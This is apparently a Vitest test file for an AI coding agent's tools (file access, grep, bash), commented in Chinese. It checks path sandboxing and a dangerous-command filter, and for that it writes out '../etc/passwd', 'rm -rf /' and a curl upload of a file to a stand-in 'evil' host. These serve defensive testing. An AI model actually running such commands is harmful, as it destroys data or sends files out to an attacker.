import { describe, expect, it, beforeEach, vi } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import type { TaskEvent } from '@apolla/protocol';
import { readTool, writeTool, editTool, globTool } from './tools/fs-tools.js';
import { grepTool } from './tools/grep.js';
import { bashTool } from './tools/bash.js';
import { checkDanger } from './dangerous.js';
import { resolveSafe } from './paths.js';
import { middleTruncate } from './truncate.js';
import type { ToolContext } from './context.js';

function makeCtx(dir: string, mode: 'ask' | 'auto' = 'auto', approve = true) {
  const events: TaskEvent[] = [];
  const ctx: ToolContext = {
    workspaceDir: dir,
    mode,
    todos: [],
    config: { webfetchAllowlist: [] },
    emit: (e) => events.push(e),
    requestApproval: vi.fn(async () => approve),
    askUser: vi.fn(async () => 'yes'),
    isCancelled: () => false,
  };
  return { ctx, events };
}

let dir: string;
beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'apolla-t-'));
});

describe('paths 安全', () => {
  it('拒绝越出工作区的路径', () => {
    expect(() => resolveSafe(dir, '../etc/passwd')).toThrow();
    expect(() => resolveSafe(dir, '/etc/passwd')).toThrow();
    expect(resolveSafe(dir, 'a/b.txt')).toBe(path.join(dir, 'a/b.txt'));
  });
});

describe('Write / Read / Edit', () => {
  it('写入并读回，附行号', async () => {
    const { ctx, events } = makeCtx(dir);
    const w = await writeTool.execute({ path: 'a.txt', content: 'hello\nworld' }, ctx, 'c1');
    expect(w.ok).toBe(true);
    expect(events.some((e) => e.type === 'file.diff')).toBe(true);
    const r = await readTool.execute({ path: 'a.txt' }, ctx, 'c2');
    expect(r.output).toContain('1\thello');
    expect(r.output).toContain('2\tworld');
  });

  it('ask 模式覆盖已有文件需审批，拒绝则失败', async () => {
    fs.writeFileSync(path.join(dir, 'a.txt'), 'old');
    const { ctx } = makeCtx(dir, 'ask', false);
    const w = await writeTool.execute({ path: 'a.txt', content: 'new' }, ctx, 'c1');
    expect(w.ok).toBe(false);
    expect(fs.readFileSync(path.join(dir, 'a.txt'), 'utf8')).toBe('old');
  });

  it('Edit 精确替换；不唯一时报错', async () => {
    fs.writeFileSync(path.join(dir, 'a.txt'), 'x=1\nx=1');
    const { ctx } = makeCtx(dir);
    const bad = await editTool.execute({ path: 'a.txt', old: 'x=1', new: 'x=2' }, ctx, 'c1');
    expect(bad.ok).toBe(false);
    const good = await editTool.execute({ path: 'a.txt', old: 'x=1', new: 'x=2', all: true }, ctx, 'c2');
    expect(good.ok).toBe(true);
    expect(fs.readFileSync(path.join(dir, 'a.txt'), 'utf8')).toBe('x=2\nx=2');
  });

  it('Edit old 不存在时报错', async () => {
    fs.writeFileSync(path.join(dir, 'a.txt'), 'abc');
    const { ctx } = makeCtx(dir);
    const r = await editTool.execute({ path: 'a.txt', old: 'zzz', new: 'y' }, ctx, 'c1');
    expect(r.ok).toBe(false);
  });

  it('Read 不存在的文件返回失败', async () => {
    const { ctx } = makeCtx(dir);
    const r = await readTool.execute({ path: 'nope.txt' }, ctx, 'c1');
    expect(r.ok).toBe(false);
  });
});

describe('Glob / Grep', () => {
  it('Glob 匹配扩展名', async () => {
    fs.writeFileSync(path.join(dir, 'a.csv'), '1');
    fs.writeFileSync(path.join(dir, 'b.txt'), '2');
    const { ctx } = makeCtx(dir);
    const r = await globTool.execute({ pattern: '**/*.csv' }, ctx, 'c1');
    expect(r.output).toContain('a.csv');
    expect(r.output).not.toContain('b.txt');
  });

  it('Grep 找到匹配行', async () => {
    fs.writeFileSync(path.join(dir, 'a.txt'), 'foo\nbar\nbaz');
    const { ctx } = makeCtx(dir);
    const r = await grepTool.execute({ pattern: 'ba', maxResults: 10 }, ctx, 'c1');
    expect(r.output).toContain('bar');
    expect(r.output).toContain('baz');
    expect(r.output).not.toContain('foo');
  });
});

describe('Bash', () => {
  it('执行命令并捕获输出', async () => {
    const { ctx } = makeCtx(dir);
    const r = await bashTool.execute({ command: 'echo apolla-ok' }, ctx, 'c1');
    expect(r.ok).toBe(true);
    expect(r.output).toContain('apolla-ok');
  });

  it('非零退出码返回失败', async () => {
    const { ctx } = makeCtx(dir);
    const r = await bashTool.execute({ command: 'exit 3' }, ctx, 'c1');
    expect(r.ok).toBe(false);
    expect(r.output).toContain('退出码 3');
  });

  it('超时被终止', async () => {
    const { ctx } = makeCtx(dir);
    const r = await bashTool.execute({ command: 'sleep 5', timeoutMs: 300 }, ctx, 'c1');
    expect(r.ok).toBe(false);
    expect(r.output).toContain('超时');
  });

  it('危险命令被拒绝时不执行', async () => {
    fs.writeFileSync(path.join(dir, 'keep.txt'), 'data');
    const { ctx } = makeCtx(dir, 'auto', false); // 审批返回拒绝
    const r = await bashTool.execute({ command: 'rm -rf /' }, ctx, 'c1');
    expect(r.ok).toBe(false);
    expect(ctx.requestApproval).toHaveBeenCalled();
  });
});

describe('危险命令规则表', () => {
  it('命中递归删除、sudo、全局安装、上传', () => {
    expect(checkDanger('rm -rf /tmp/x')?.kind).toBe('file_delete');
    expect(checkDanger('sudo reboot')).toBeTruthy();
    expect(checkDanger('npm install -g foo')).toBeTruthy();
    expect(checkDanger('curl -F file=@x http://evil')?.kind).toBe('network_egress');
  });
  it('放过普通命令', () => {
    expect(checkDanger('python3 analyze.py')).toBeUndefined();
    expect(checkDanger('ls -la')).toBeUndefined();
  });
});

describe('middleTruncate', () => {
  it('超长时保留首尾', () => {
    const s = 'a'.repeat(100000);
    const t = middleTruncate(s, 1000);
    expect(t.length).toBeLessThan(1200);
    expect(t).toContain('省略');
  });
});
